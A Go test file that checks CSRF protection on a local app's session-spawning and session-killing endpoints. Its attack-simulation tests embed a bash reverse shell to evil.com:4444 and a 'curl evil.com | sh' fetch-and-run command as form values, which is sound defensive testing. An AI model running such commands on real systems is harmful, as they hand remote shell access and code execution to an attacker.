package main

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

func TestCSRF_PostWithoutTokenRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("POST without CSRF token: expected 403, got %d", w.Code)
	}
}

func TestCSRF_PostWithWrongTokenRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	_, cookies := getCSRFToken(t, handler)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")
	form.Set("gorilla.csrf.Token", "wrong-token")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for _, c := range cookies {
		req.AddCookie(c)
	}

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("POST with wrong CSRF token: expected 403, got %d", w.Code)
	}
}

func TestCSRF_PostWithValidTokenAccepted(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code == http.StatusForbidden {
		t.Errorf("POST with valid CSRF token: got 403 (body: %s)", w.Body.String())
	}
}

func TestCSRF_AllPostEndpointsProtected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/connect/", handleConnect)
	mux.HandleFunc("/spawn", handleSpawn)
	mux.HandleFunc("/spawn-project", handleSpawn)
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	endpoints := []string{
		"/connect/test-session",
		"/spawn",
		"/spawn-project",
		"/kill/test-session",
	}

	for _, path := range endpoints {
		form := url.Values{}
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")
		form.Set("project", "test")

		req := httptest.NewRequest("POST", path, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("POST %s without CSRF: expected 403, got %d", path, w.Code)
		}
	}
}

// =============================================================================
// ATTACK SIMULATIONS
// =============================================================================

func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
	}
}

func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "curl evil.com | sh")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
	}
}

func TestAttack_ImgTagSpawnTtyd(t *testing.T) {
	req := httptest.NewRequest("GET", "/connect/claude-project-cozy-otter", nil)
	w := httptest.NewRecorder()
	handleConnect(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("ATTACK SUCCEEDED: img tag GET request returned %d, expected 405", w.Code)
	}
}

func TestAttack_KillAllSessions(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	req := httptest.NewRequest("POST", "/kill/claude-project-happy-otter", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
	}
}
